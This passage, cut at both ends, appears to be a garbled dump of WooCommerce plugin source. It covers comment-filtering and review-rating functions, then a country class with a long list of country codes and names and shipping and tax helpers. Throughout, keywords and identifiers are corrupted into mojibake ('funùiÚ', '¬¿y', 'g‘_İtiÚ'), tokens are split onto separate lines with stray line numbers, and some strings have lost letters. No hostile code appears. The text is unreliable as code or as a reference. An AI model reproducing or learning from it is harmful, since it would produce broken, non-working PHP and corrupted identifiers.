, 'exclude_order_comments_from_feed_join' ) );

33 
	`add_aùiÚ
Ğ'comm’t_ãed_wh”e', 
	`¬¿y
Ğ
$this
, 'exclude_order_comments_from_feed_where' ) );

48 
public
 
funùiÚ
 
	$exşude_Üd”_comm’ts
Ğ
$şau£s
 ) {

49 
glob®
 
$wpdb
, 
$ty³now
, 
$·g’ow
;

51 iàĞ
	`is_admš
(è&& 
$ty³now
 =ğ'shİ_Üd”' && 
	`cu¼’t_u£r_ÿn
( 'manage_woocommerce' ) )

52  
$şau£s
;

54 iàĞ! 
$şau£s
['join'] )

55 
$şau£s
['join'] = '';

57 iàĞ! 
	`¡r¡r
Ğ
$şau£s
['join'], "JOIN $wpdb->posts" ) )

58 
$şau£s
['join'] .= " LEFT JOIN $wpdb->posts ON comment_post_ID = $wpdb->posts.ID ";

60 iàĞ
$şau£s
['where'] )

61 
$şau£s
['where'] .= ' AND ';

63 
$şau£s
['where'] .= " $wpdb->posts.post_type NOT IN ('shop_order') ";

65  
$şau£s
;

66 
	}
}

74 
public
 
funùiÚ
 
	$exşude_Üd”_comm’ts_äom_ãed_još
Ğ
$još
 ) {

75 
glob®
 
$wpdb
;

77 iàĞ! 
	`¡r¡r
Ğ
$još
, 
$wpdb
->
po¡s
 ) )

78 
$još
 = " LEFT JOIN $wpdb->posts ON $wpdb->comments.comment_post_ID = $wpdb->posts.ID ";

80  
$još
;

81 
	}
}

89 
public
 
funùiÚ
 
	$exşude_Üd”_comm’ts_äom_ãed_wh”e
Ğ
$wh”e
 ) {

90 
glob®
 
$wpdb
;

92 iàĞ
$wh”e
 )

93 
$wh”e
 .= ' AND ';

95 
$wh”e
 .= " $wpdb->posts.post_type NOT IN ('shop_order') ";

97  
$wh”e
;

98 
	}
}

106 
public
 
funùiÚ
 
	$check_comm’t_¿tšg
Ğ
$comm’t_d©a
 ) {

108 iàĞ
	`is£t
Ğ
$_POST
['¿tšg'] ) && 
	`em±y
Ğ$_POST['¿tšg'] ) && 
$comm’t_d©a
['comm’t_ty³'] ==ğ'' && 
	`g‘_İtiÚ
('woocommerce_review_rating_required') === 'yes' ) {

109 
	`wp_d›
Ğ
	`__
( 'Please„atehe…roduct.', 'woocommerce' ) );

110 
ex™
;

112  
$comm’t_d©a
;

113 
	}
}

120 
public
 
funùiÚ
 
	$add_comm’t_¿tšg
Ğ
$comm’t_id
 ) {

121 iàĞ
	`is£t
Ğ
$_POST
['rating'] ) ) {

123 iàĞ! 
$_POST
['rating'] || $_POST['rating'] > 5 || $_POST['rating'] < 0 )

126 
	`add_comm’t_m‘a
Ğ
$comm’t_id
, '¿tšg', (è
	`esc_©Œ
Ğ
$_POST
['¿tšg'] ), 
Œue
 );

128 
$this
->
	`ş—r_Œªs›Ás
Ğ
$comm’t_id
 );

130 
	}
}

137 
public
 
funùiÚ
 
	$ş—r_Œªs›Ás
Ğ
$comm’t_id
 ) {

138 
$comm’t
 = 
	`g‘_comm’t
Ğ
$comm’t_id
 );

140 iàĞ! 
	`em±y
Ğ
$comm’t
->
comm’t_po¡_ID
 ) ) {

141 
	`d–‘e_Œªs›Á
Ğ'wc_av”age_¿tšg_' . 
	`absšt
Ğ
$comm’t
->
comm’t_po¡_ID
 ) );

142 
	`d–‘e_Œªs›Á
Ğ'wc_¿tšg_couÁ_' . 
	`absšt
Ğ
$comm’t
->
comm’t_po¡_ID
 ) );

144 
	}
}

147 
Ãw
 
WC_Comm’ts
();

	@includes/class-wc-countries.php

1 <?
php


13 şas 
	cWC_CouÁr›s
 {

16 
public
 
	m$couÁr›s
;

19 
public
 
	m$¡©es
;

22 
public
 
	m$loÿË
;

25 
public
 
	m$add»ss_fÜm©s
;

33 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

34 
glob®
 
$woocomm”û
, 
$¡©es
;

36 
$this
->
couÁr›s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s', 
	`¬¿y
(

37 'AF' => 
	`__
( 'Afghanistan', 'woocommerce' ),

38 'AX' => 
	`__
( '&#197;land Islands', 'woocommerce' ),

39 'AL' => 
	`__
( 'Albania', 'woocommerce' ),

40 'DZ' => 
	`__
( 'Algeria', 'woocommerce' ),

41 'AD' => 
	`__
( 'Andorra', 'woocommerce' ),

42 'AO' => 
	`__
( 'Angola', 'woocommerce' ),

43 'AI' => 
	`__
( 'Anguilla', 'woocommerce' ),

44 'AQ' => 
	`__
( 'Antarctica', 'woocommerce' ),

45 'AG' => 
	`__
( 'Antigua‡nd Barbuda', 'woocommerce' ),

46 'AR' => 
	`__
( 'Argentina', 'woocommerce' ),

47 'AM' => 
	`__
( 'Armenia', 'woocommerce' ),

48 'AW' => 
	`__
( 'Aruba', 'woocommerce' ),

49 'AU' => 
	`__
( 'Australia', 'woocommerce' ),

50 'AT' => 
	`__
( 'Austria', 'woocommerce' ),

51 'AZ' => 
	`__
( 'Azerbaijan', 'woocommerce' ),

52 'BS' => 
	`__
( 'Bahamas', 'woocommerce' ),

53 'BH' => 
	`__
( 'Bahrain', 'woocommerce' ),

54 'BD' => 
	`__
( 'Bangladesh', 'woocommerce' ),

55 'BB' => 
	`__
( 'Barbados', 'woocommerce' ),

56 'BY' => 
	`__
( 'Belarus', 'woocommerce' ),

57 'BE' => 
	`__
( 'Belgium', 'woocommerce' ),

58 'PW' => 
	`__
( 'Belau', 'woocommerce' ),

59 'BZ' => 
	`__
( 'Belize', 'woocommerce' ),

60 'BJ' => 
	`__
( 'Benin', 'woocommerce' ),

61 'BM' => 
	`__
( 'Bermuda', 'woocommerce' ),

62 'BT' => 
	`__
( 'Bhutan', 'woocommerce' ),

63 'BO' => 
	`__
( 'Bolivia', 'woocommerce' ),

64 'BQ' => 
	`__
( 'Bonaire, Saint Eustatius‡nd Saba', 'woocommerce' ),

65 'BA' => 
	`__
( 'Bosnia‡nd Herzegovina', 'woocommerce' ),

66 'BW' => 
	`__
( 'Botswana', 'woocommerce' ),

67 'BV' => 
	`__
( 'Bouvet Island', 'woocommerce' ),

68 'BR' => 
	`__
( 'Brazil', 'woocommerce' ),

69 'IO' => 
	`__
( 'British Indian Ocean Territory', 'woocommerce' ),

70 'VG' => 
	`__
( 'British Virgin Islands', 'woocommerce' ),

71 'BN' => 
	`__
( 'Brunei', 'woocommerce' ),

72 'BG' => 
	`__
( 'Bulgaria', 'woocommerce' ),

73 'BF' => 
	`__
( 'Burkina Faso', 'woocommerce' ),

74 'BI' => 
	`__
( 'Burundi', 'woocommerce' ),

75 'KH' => 
	`__
( 'Cambodia', 'woocommerce' ),

76 'CM' => 
	`__
( 'Cameroon', 'woocommerce' ),

77 'CA' => 
	`__
( 'Canada', 'woocommerce' ),

78 'CV' => 
	`__
( 'Cape Verde', 'woocommerce' ),

79 'KY' => 
	`__
( 'Cayman Islands', 'woocommerce' ),

80 'CF' => 
	`__
( 'Central African Republic', 'woocommerce' ),

81 'TD' => 
	`__
( 'Chad', 'woocommerce' ),

82 'CL' => 
	`__
( 'Chile', 'woocommerce' ),

83 'CN' => 
	`__
( 'China', 'woocommerce' ),

84 'CX' => 
	`__
( 'Christmas Island', 'woocommerce' ),

85 'CC' => 
	`__
( 'Cocos (Keeling) Islands', 'woocommerce' ),

86 'CO' => 
	`__
( 'Colombia', 'woocommerce' ),

87 'KM' => 
	`__
( 'Comoros', 'woocommerce' ),

88 'CG' => 
	`__
( 'Congo (Brazzaville)', 'woocommerce' ),

89 'CD' => 
	`__
( 'Congo (Kinshasa)', 'woocommerce' ),

90 'CK' => 
	`__
( 'Cook Islands', 'woocommerce' ),

91 'CR' => 
	`__
( 'Costa Rica', 'woocommerce' ),

92 'HR' => 
	`__
( 'Croatia', 'woocommerce' ),

93 'CU' => 
	`__
( 'Cuba', 'woocommerce' ),

94 'CW' => 
	`__
( 'Cura&Ccedil;ao', 'woocommerce' ),

95 'CY' => 
	`__
( 'Cyprus', 'woocommerce' ),

96 'CZ' => 
	`__
( 'Czech Republic', 'woocommerce' ),

97 'DK' => 
	`__
( 'Denmark', 'woocommerce' ),

98 'DJ' => 
	`__
( 'Djibouti', 'woocommerce' ),

99 'DM' => 
	`__
( 'Dominica', 'woocommerce' ),

100 'DO' => 
	`__
( 'Dominican Republic', 'woocommerce' ),

101 'EC' => 
	`__
( 'Ecuador', 'woocommerce' ),

102 'EG' => 
	`__
( 'Egypt', 'woocommerce' ),

103 'SV' => 
	`__
( 'El Salvador', 'woocommerce' ),

104 'GQ' => 
	`__
( 'Equatorial Guinea', 'woocommerce' ),

105 'ER' => 
	`__
( 'Eritrea', 'woocommerce' ),

106 'EE' => 
	`__
( 'Estonia', 'woocommerce' ),

107 'ET' => 
	`__
( 'Ethiopia', 'woocommerce' ),

108 'FK' => 
	`__
( 'Falkland Islands', 'woocommerce' ),

109 'FO' => 
	`__
( 'Faroe Islands', 'woocommerce' ),

110 'FJ' => 
	`__
( 'Fiji', 'woocommerce' ),

111 'FI' => 
	`__
( 'Finland', 'woocommerce' ),

112 'FR' => 
	`__
( 'France', 'woocommerce' ),

113 'GF' => 
	`__
( 'French Guiana', 'woocommerce' ),

114 'PF' => 
	`__
( 'French Polynesia', 'woocommerce' ),

115 'TF' => 
	`__
( 'French Southern Territories', 'woocommerce' ),

116 'GA' => 
	`__
( 'Gabon', 'woocommerce' ),

117 'GM' => 
	`__
( 'Gambia', 'woocommerce' ),

118 'GE' => 
	`__
( 'Georgia', 'woocommerce' ),

119 'DE' => 
	`__
( 'Germany', 'woocommerce' ),

120 'GH' => 
	`__
( 'Ghana', 'woocommerce' ),

121 'GI' => 
	`__
( 'Gibraltar', 'woocommerce' ),

122 'GR' => 
	`__
( 'Greece', 'woocommerce' ),

123 'GL' => 
	`__
( 'Greenland', 'woocommerce' ),

124 'GD' => 
	`__
( 'Grenada', 'woocommerce' ),

125 'GP' => 
	`__
( 'Guadeloupe', 'woocommerce' ),

126 'GT' => 
	`__
( 'Guatemala', 'woocommerce' ),

127 'GG' => 
	`__
( 'Guernsey', 'woocommerce' ),

128 'GN' => 
	`__
( 'Guinea', 'woocommerce' ),

129 'GW' => 
	`__
( 'Guinea-Bissau', 'woocommerce' ),

130 'GY' => 
	`__
( 'Guyana', 'woocommerce' ),

131 'HT' => 
	`__
( 'Haiti', 'woocommerce' ),

132 'HM' => 
	`__
( 'Heard Island‡nd McDonald Islands', 'woocommerce' ),

133 'HN' => 
	`__
( 'Honduras', 'woocommerce' ),

134 'HK' => 
	`__
( 'Hong Kong', 'woocommerce' ),

135 'HU' => 
	`__
( 'Hungary', 'woocommerce' ),

136 'IS' => 
	`__
( 'Iceland', 'woocommerce' ),

137 'IN' => 
	`__
( 'India', 'woocommerce' ),

138 'ID' => 
	`__
( 'Indonesia', 'woocommerce' ),

139 'IR' => 
	`__
( 'Iran', 'woocommerce' ),

140 'IQ' => 
	`__
( 'Iraq', 'woocommerce' ),

141 'IE' => 
	`__
( 'Republic of Ireland', 'woocommerce' ),

142 'IM' => 
	`__
( 'Isle of Man', 'woocommerce' ),

143 'IL' => 
	`__
( 'Israel', 'woocommerce' ),

144 'IT' => 
	`__
( 'Italy', 'woocommerce' ),

145 'CI' => 
	`__
( 'Ivory Coast', 'woocommerce' ),

146 'JM' => 
	`__
( 'Jamaica', 'woocommerce' ),

147 'JP' => 
	`__
( 'Japan', 'woocommerce' ),

148 'JE' => 
	`__
( 'Jersey', 'woocommerce' ),

149 'JO' => 
	`__
( 'Jordan', 'woocommerce' ),

150 'KZ' => 
	`__
( 'Kazakhstan', 'woocommerce' ),

151 'KE' => 
	`__
( 'Kenya', 'woocommerce' ),

152 'KI' => 
	`__
( 'Kiribati', 'woocommerce' ),

153 'KW' => 
	`__
( 'Kuwait', 'woocommerce' ),

154 'KG' => 
	`__
( 'Kyrgyzstan', 'woocommerce' ),

155 'LA' => 
	`__
( 'Laos', 'woocommerce' ),

156 'LV' => 
	`__
( 'Latvia', 'woocommerce' ),

157 'LB' => 
	`__
( 'Lebanon', 'woocommerce' ),

158 'LS' => 
	`__
( 'Lesotho', 'woocommerce' ),

159 'LR' => 
	`__
( 'Liberia', 'woocommerce' ),

160 'LY' => 
	`__
( 'Libya', 'woocommerce' ),

161 'LI' => 
	`__
( 'Liechtenstein', 'woocommerce' ),

162 'LT' => 
	`__
( 'Lithuania', 'woocommerce' ),

163 'LU' => 
	`__
( 'Luxembourg', 'woocommerce' ),

164 'MO' => 
	`__
( 'Macao S.A.R., China', 'woocommerce' ),

165 'MK' => 
	`__
( 'Macedonia', 'woocommerce' ),

166 'MG' => 
	`__
( 'Madagascar', 'woocommerce' ),

167 'MW' => 
	`__
( 'Malawi', 'woocommerce' ),

168 'MY' => 
	`__
( 'Malaysia', 'woocommerce' ),

169 'MV' => 
	`__
( 'Maldives', 'woocommerce' ),

170 'ML' => 
	`__
( 'Mali', 'woocommerce' ),

171 'MT' => 
	`__
( 'Malta', 'woocommerce' ),

172 'MH' => 
	`__
( 'Marshall Islands', 'woocommerce' ),

173 'MQ' => 
	`__
( 'Martinique', 'woocommerce' ),

174 'MR' => 
	`__
( 'Mauritania', 'woocommerce' ),

175 'MU' => 
	`__
( 'Mauritius', 'woocommerce' ),

176 'YT' => 
	`__
( 'Mayotte', 'woocommerce' ),

177 'MX' => 
	`__
( 'Mexico', 'woocommerce' ),

178 'FM' => 
	`__
( 'Micronesia', 'woocommerce' ),

179 'MD' => 
	`__
( 'Moldova', 'woocommerce' ),

180 'MC' => 
	`__
( 'Monaco', 'woocommerce' ),

181 'MN' => 
	`__
( 'Mongolia', 'woocommerce' ),

182 'ME' => 
	`__
( 'Montenegro', 'woocommerce' ),

183 'MS' => 
	`__
( 'Montserrat', 'woocommerce' ),

184 'MA' => 
	`__
( 'Morocco', 'woocommerce' ),

185 'MZ' => 
	`__
( 'Mozambique', 'woocommerce' ),

186 'MM' => 
	`__
( 'Myanmar', 'woocommerce' ),

187 'NA' => 
	`__
( 'Namibia', 'woocommerce' ),

188 'NR' => 
	`__
( 'Nauru', 'woocommerce' ),

189 'NP' => 
	`__
( 'Nepal', 'woocommerce' ),

190 'NL' => 
	`__
( 'Netherlands', 'woocommerce' ),

191 'AN' => 
	`__
( 'Netherlands Antilles', 'woocommerce' ),

192 'NC' => 
	`__
( 'New Caledonia', 'woocommerce' ),

193 'NZ' => 
	`__
( 'New Zealand', 'woocommerce' ),

194 'NI' => 
	`__
( 'Nicaragua', 'woocommerce' ),

195 'NE' => 
	`__
( 'Niger', 'woocommerce' ),

196 'NG' => 
	`__
( 'Nigeria', 'woocommerce' ),

197 'NU' => 
	`__
( 'Niue', 'woocommerce' ),

198 'NF' => 
	`__
( 'Norfolk Island', 'woocommerce' ),

199 'KP' => 
	`__
( 'North Korea', 'woocommerce' ),

200 'NO' => 
	`__
( 'Norway', 'woocommerce' ),

201 'OM' => 
	`__
( 'Oman', 'woocommerce' ),

202 'PK' => 
	`__
( 'Pakistan', 'woocommerce' ),

203 'PS' => 
	`__
( 'Palestinian Territory', 'woocommerce' ),

204 'PA' => 
	`__
( 'Panama', 'woocommerce' ),

205 'PG' => 
	`__
( 'Papua New Guinea', 'woocommerce' ),

206 'PY' => 
	`__
( 'Paraguay', 'woocommerce' ),

207 'PE' => 
	`__
( 'Peru', 'woocommerce' ),

208 'PH' => 
	`__
( 'Philippines', 'woocommerce' ),

209 'PN' => 
	`__
( 'Pitcairn', 'woocommerce' ),

210 'PL' => 
	`__
( 'Poland', 'woocommerce' ),

211 'PT' => 
	`__
( 'Portugal', 'woocommerce' ),

212 'QA' => 
	`__
( 'Qatar', 'woocommerce' ),

213 'RE' => 
	`__
( 'Reunion', 'woocommerce' ),

214 'RO' => 
	`__
( 'Romania', 'woocommerce' ),

215 'RU' => 
	`__
( 'Russia', 'woocommerce' ),

216 'RW' => 
	`__
( 'Rwanda', 'woocommerce' ),

217 'BL' => 
	`__
( 'Saint Barth&eacute;lemy', 'woocommerce' ),

218 'SH' => 
	`__
( 'Saint Helena', 'woocommerce' ),

219 'KN' => 
	`__
( 'Saint Kitts‡nd Nevis', 'woocommerce' ),

220 'LC' => 
	`__
( 'Saint Lucia', 'woocommerce' ),

221 'MF' => 
	`__
( 'Saint Martin (French…art)', 'woocommerce' ),

222 'SX' => 
	`__
( 'Saint Martin (Dutch…art)', 'woocommerce' ),

223 'PM' => 
	`__
( 'Saint Pierre‡nd Miquelon', 'woocommerce' ),

224 'VC' => 
	`__
( 'Saint Vincent‡ndhe Grenadines', 'woocommerce' ),

225 'SM' => 
	`__
( 'San Marino', 'woocommerce' ),

226 'ST' => 
	`__
( 'S&atilde;o Tom&eacute;‡nd Pr&iacute;ncipe', 'woocommerce' ),

227 'SA' => 
	`__
( 'Saudi Arabia', 'woocommerce' ),

228 'SN' => 
	`__
( 'Senegal', 'woocommerce' ),

229 'RS' => 
	`__
( 'Serbia', 'woocommerce' ),

230 'SC' => 
	`__
( 'Seychelles', 'woocommerce' ),

231 'SL' => 
	`__
( 'Sierra Leone', 'woocommerce' ),

232 'SG' => 
	`__
( 'Singapore', 'woocommerce' ),

233 'SK' => 
	`__
( 'Slovakia', 'woocommerce' ),

234 'SI' => 
	`__
( 'Slovenia', 'woocommerce' ),

235 'SB' => 
	`__
( 'Solomon Islands', 'woocommerce' ),

236 'SO' => 
	`__
( 'Somalia', 'woocommerce' ),

237 'ZA' => 
	`__
( 'South Africa', 'woocommerce' ),

238 'GS' => 
	`__
( 'South Georgia/Sandwich Islands', 'woocommerce' ),

239 'KR' => 
	`__
( 'South Korea', 'woocommerce' ),

240 'SS' => 
	`__
( 'South Sudan', 'woocommerce' ),

241 'ES' => 
	`__
( 'Spain', 'woocommerce' ),

242 'LK' => 
	`__
( 'Sri Lanka', 'woocommerce' ),

243 'SD' => 
	`__
( 'Sudan', 'woocommerce' ),

244 'SR' => 
	`__
( 'Suriname', 'woocommerce' ),

245 'SJ' => 
	`__
( 'Svalbard‡nd Jan Mayen', 'woocommerce' ),

246 'SZ' => 
	`__
( 'Swaziland', 'woocommerce' ),

247 'SE' => 
	`__
( 'Sweden', 'woocommerce' ),

248 'CH' => 
	`__
( 'Switzerland', 'woocommerce' ),

249 'SY' => 
	`__
( 'Syria', 'woocommerce' ),

250 'TW' => 
	`__
( 'Taiwan', 'woocommerce' ),

251 'TJ' => 
	`__
( 'Tajikistan', 'woocommerce' ),

252 'TZ' => 
	`__
( 'Tanzania', 'woocommerce' ),

253 'TH' => 
	`__
( 'Thailand', 'woocommerce' ),

254 'TL' => 
	`__
( 'Timor-Leste', 'woocommerce' ),

255 'TG' => 
	`__
( 'Togo', 'woocommerce' ),

256 'TK' => 
	`__
( 'Tokelau', 'woocommerce' ),

257 'TO' => 
	`__
( 'Tonga', 'woocommerce' ),

258 'TT' => 
	`__
( 'Trinidad‡nd Tobago', 'woocommerce' ),

259 'TN' => 
	`__
( 'Tunisia', 'woocommerce' ),

260 'TR' => 
	`__
( 'Turkey', 'woocommerce' ),

261 'TM' => 
	`__
( 'Turkmenistan', 'woocommerce' ),

262 'TC' => 
	`__
( 'Turks‡nd Caicos Islands', 'woocommerce' ),

263 'TV' => 
	`__
( 'Tuvalu', 'woocommerce' ),

264 'UG' => 
	`__
( 'Uganda', 'woocommerce' ),

265 'UA' => 
	`__
( 'Ukraine', 'woocommerce' ),

266 'AE' => 
	`__
( 'United Arab Emirates', 'woocommerce' ),

267 'GB' => 
	`__
( 'United Kingdom (UK)', 'woocommerce' ),

268 'US' => 
	`__
( 'United States (US)', 'woocommerce' ),

269 'UY' => 
	`__
( 'Uruguay', 'woocommerce' ),

270 'UZ' => 
	`__
( 'Uzbekistan', 'woocommerce' ),

271 'VU' => 
	`__
( 'Vanuatu', 'woocommerce' ),

272 'VA' => 
	`__
( 'Vatican', 'woocommerce' ),

273 'VE' => 
	`__
( 'Venezuela', 'woocommerce' ),

274 'VN' => 
	`__
( 'Vietnam', 'woocommerce' ),

275 'WF' => 
	`__
( 'Wallis‡nd Futuna', 'woocommerce' ),

276 'EH' => 
	`__
( 'Western Sahara', 'woocommerce' ),

277 'WS' => 
	`__
( 'Western Samoa', 'woocommerce' ),

278 'YE' => 
	`__
( 'Yemen', 'woocommerce' ),

279 'ZM' => 
	`__
( 'Zambia', 'woocommerce' ),

280 'ZW' => 
	`__
( 'Zimbabwe', 'woocommerce' )

284 
$¡©es
 = 
	`¬¿y
(

285 'AF' => 
	`¬¿y
(),

286 'AT' => 
	`¬¿y
(),

287 'BE' => 
	`¬¿y
(),

288 'BI' => 
	`¬¿y
(),

289 'CZ' => 
	`¬¿y
(),

290 'DE' => 
	`¬¿y
(),

291 'DK' => 
	`¬¿y
(),

292 'EE' => 
	`¬¿y
(),

293 'FI' => 
	`¬¿y
(),

294 'FR' => 
	`¬¿y
(),

295 'IS' => 
	`¬¿y
(),

296 'IL' => 
	`¬¿y
(),

297 'KR' => 
	`¬¿y
(),

298 'NL' => 
	`¬¿y
(),

299 'NO' => 
	`¬¿y
(),

300 'PL' => 
	`¬¿y
(),

301 'PT' => 
	`¬¿y
(),

302 'SG' => 
	`¬¿y
(),

303 'SK' => 
	`¬¿y
(),

304 'SI' => 
	`¬¿y
(),

305 'LK' => 
	`¬¿y
(),

306 'SE' => 
	`¬¿y
(),

307 'VN' => 
	`¬¿y
(),

311 
$®lowed
 = 
	`¬¿y_m”ge
Ğ
$this
->
	`g‘_®lowed_couÁr›s
(), $this->
	`g‘_shpšg_couÁr›s
() );

313 iàĞ
$®lowed
 )

314 
	`fÜ—ch
 ( 
$®lowed
 
as
 
$CC
 => 
$couÁry
 )

315 iàĞ! 
	`is£t
Ğ
$¡©es
[ 
$CC
 ] ) && 
	`fe_exi¡s
Ğ
	`WC
()->
	`¶ugš_·th
() . '/i18n/states/' . $CC . '.php' ) )

316 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
(è. '/i18n/¡©es/' . 
$CC
 . '.php' );

318 
$this
->
¡©es
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_¡©es', 
$¡©es
 );

327 
public
 
funùiÚ
 
	$g‘_ba£_couÁry
() {

328 
$deçuÉ
 = 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
('woocommerce_default_country') );

329 
$couÁry
 = ( ( 
$pos
 = 
	`¡¼pos
Ğ
$deçuÉ
, ':' ) ) ==ğ
çl£
 ) ? $deçuÉ : 
	`sub¡r
( $default, 0, $pos );

331  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_ba£_couÁry', 
$couÁry
 );

332 
	}
}

340 
public
 
funùiÚ
 
	$g‘_ba£_¡©e
() {

341 
$deçuÉ
 = 
	`wc_ş—n
Ğ
	`g‘_İtiÚ
( 'woocommerce_default_country' ) );

342 
$¡©e
 = ( ( 
$pos
 = 
	`¡¼pos
Ğ
$deçuÉ
, ':' ) ) ==ğ
çl£
 ) ? '' : 
	`sub¡r
( $default, $pos + 1 );

344  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_ba£_¡©e', 
$¡©e
 );

345 
	}
}

353 
public
 
funùiÚ
 
	$g‘_ba£_c™y
() {

354  
	`­¶y_f‹rs
( 'woocommerce_countries_base_city', '' );

355 
	}
}

363 
public
 
funùiÚ
 
	$g‘_ba£_po¡code
() {

364  
	`­¶y_f‹rs
( 'woocommerce_countries_base_postcode', '' );

365 
	}
}

373 
public
 
funùiÚ
 
	$g‘_®lowed_couÁr›s
() {

375 iàĞ
	`­¶y_f‹rs
('woocomm”û_sÜt_couÁr›s', 
Œue
 ) )

376 
	`asÜt
Ğ
$this
->
couÁr›s
 );

378 iàĞ
	`g‘_İtiÚ
('woocommerce_allowed_countries') !== 'specific' )

379  
$this
->
couÁr›s
;

381 
$couÁr›s
 = 
	`¬¿y
();

383 
$¿w_couÁr›s
 = 
	`g‘_İtiÚ
( 'woocommerce_specific_allowed_countries' );

385 
	`fÜ—ch
 ( 
$¿w_couÁr›s
 
as
 
$couÁry
 )

386 
$couÁr›s
[ 
$couÁry
 ] = 
$this
->
couÁr›s
[ $country ];

388  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_®lowed_couÁr›s', 
$couÁr›s
 );

389 
	}
}

397 
public
 
funùiÚ
 
	$g‘_shpšg_couÁr›s
() {

399 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_sÜt_couÁr›s', 
Œue
 ) )

400 
	`asÜt
Ğ
$this
->
couÁr›s
 );

402 iàĞ
	`g‘_İtiÚ
( 'woocommerce_ship_to_countries' ) == '' )

403  
$this
->
	`g‘_®lowed_couÁr›s
();

405 iàĞ
	`g‘_İtiÚ
('woocommerce_ship_to_countries') !== 'specific' )

406  
$this
->
couÁr›s
;

408 
$couÁr›s
 = 
	`¬¿y
();

410 
$¿w_couÁr›s
 = 
	`g‘_İtiÚ
( 'woocommerce_specific_ship_to_countries' );

412 
	`fÜ—ch
 ( 
$¿w_couÁr›s
 
as
 
$couÁry
 )

413 
$couÁr›s
[ 
$couÁry
 ] = 
$this
->
couÁr›s
[ $country ];

415  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_shpšg_couÁr›s', 
$couÁr›s
 );

416 
	}
}

424 
public
 
funùiÚ
 
	$g‘_®lowed_couÁry_¡©es
() {

426 iàĞ
	`g‘_İtiÚ
('woocommerce_allowed_countries') !== 'specific' )

427  
$this
->
¡©es
;

429 
$¡©es
 = 
	`¬¿y
();

431 
$¿w_couÁr›s
 = 
	`g‘_İtiÚ
( 'woocommerce_specific_allowed_countries' );

433 
	`fÜ—ch
 ( 
$¿w_couÁr›s
 
as
 
$couÁry
 )

434 iàĞ
	`is£t
Ğ
$this
->
¡©es
[ 
$couÁry
 ] ) )

435 
$¡©es
[ 
$couÁry
 ] = 
$this
->
¡©es
[ $country ];

437  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_®lowed_couÁry_¡©es', 
$¡©es
 );

438 
	}
}

446 
public
 
funùiÚ
 
	$g‘_shpšg_couÁry_¡©es
() {

448 iàĞ
	`g‘_İtiÚ
( 'woocommerce_ship_to_countries' ) == '' )

449  
$this
->
	`g‘_®lowed_couÁry_¡©es
();

451 iàĞ
	`g‘_İtiÚ
( 'woocommerce_ship_to_countries' ) !== 'specific' )

452  
$this
->
¡©es
;

454 
$¡©es
 = 
	`¬¿y
();

456 
$¿w_couÁr›s
 = 
	`g‘_İtiÚ
( 'woocommerce_specific_ship_to_countries' );

458 
	`fÜ—ch
 ( 
$¿w_couÁr›s
 
as
 
$couÁry
 )

459 iàĞ! 
	`em±y
Ğ
$this
->
¡©es
[ 
$couÁry
 ] ) )

460 
$¡©es
[ 
$couÁry
 ] = 
$this
->
¡©es
[ $country ];

462  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_shpšg_couÁry_¡©es', 
$¡©es
 );

463 
	}
}

471 
public
 
funùiÚ
 
	$g‘_eurİ—n_uniÚ_couÁr›s
() {

472  
	`¬¿y
( 'AT', 'BE', 'BG', 'CY', 'CZ', 'DE', 'DK', 'EE', 'ES', 'FI', 'FR', 'GB', 'GR', 'HU', 'HR', 'IE', 'IT', 'LT', 'LU', 'LV', 'MT', 'NL', 'PL', 'PT', 'RO', 'SE', 'SI', 'SK' );

473 
	}
}

482 
public
 
funùiÚ
 
	$shpšg_to_´efix
() {

483 
$»tuº
 = '';

484 ià(
	`š_¬¿y
(
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
(), 
	`¬¿y
Ğ'GB', 'US', 'AE', 'CZ', 'DO', 'NL', 'PH', 'USAF' ))è
$»tuº
 = 
	`__
( 'tohe', 'woocommerce' );

485 
$»tuº
 = 
	`__
( 'to', 'woocommerce' );

486  
	`­¶y_f‹rs
('woocomm”û_couÁr›s_shpšg_to_´efix', 
$»tuº
, 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
());

487 
	}
}

496 
public
 
funùiÚ
 
	$e¡im©ed_fÜ_´efix
() {

497 
$»tuº
 = '';

498 ià(
	`š_¬¿y
(
$this
->
	`g‘_ba£_couÁry
(), 
	`¬¿y
Ğ'GB', 'US', 'AE', 'CZ', 'DO', 'NL', 'PH', 'USAF' ))è
$»tuº
 = 
	`__
( 'the', 'woocommerce' ) . ' ';

499  
	`­¶y_f‹rs
('woocomm”û_couÁr›s_e¡im©ed_fÜ_´efix', 
$»tuº
, 
$this
->
	`g‘_ba£_couÁry
());

500 
	}
}

509 
public
 
funùiÚ
 
	$x_Ü_v©
() {

510 
$»tuº
 = ( 
	`š_¬¿y
(
$this
->
	`g‘_ba£_couÁry
(), $this->
	`g‘_eurİ—n_uniÚ_couÁr›s
()èè? 
	`__
( 'VAT', 'woocommerce' ) : __( 'Tax', 'woocommerce' );

512  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_x_Ü_v©', 
$»tuº
 );

513 
	}
}

522 
public
 
funùiÚ
 
	$šc_x_Ü_v©
() {

523 
$»tuº
 = ( 
	`š_¬¿y
(
$this
->
	`g‘_ba£_couÁry
(), $this->
	`g‘_eurİ—n_uniÚ_couÁr›s
()èè? 
	`__
( '(incl. VAT)', 'woocommerce' ) : __( '(incl.ax)', 'woocommerce' );

525  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_šc_x_Ü_v©', 
$»tuº
 );

526 
	}
}

535 
public
 
funùiÚ
 
	$ex_x_Ü_v©
() {

536 
$»tuº
 = ( 
	`š_¬¿y
(
$this
->
	`g‘_ba£_couÁry
(), $this->
	`g‘_eurİ—n_uniÚ_couÁr›s
()èè? 
	`__
( '(ex. VAT)', 'woocommerce' ) : __( '(ex.ax)', 'woocommerce' );

538  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁr›s_ex_x_Ü_v©', 
$»tuº
 );

539 
	}
}

549 
public
 
funùiÚ
 
	$g‘_¡©es
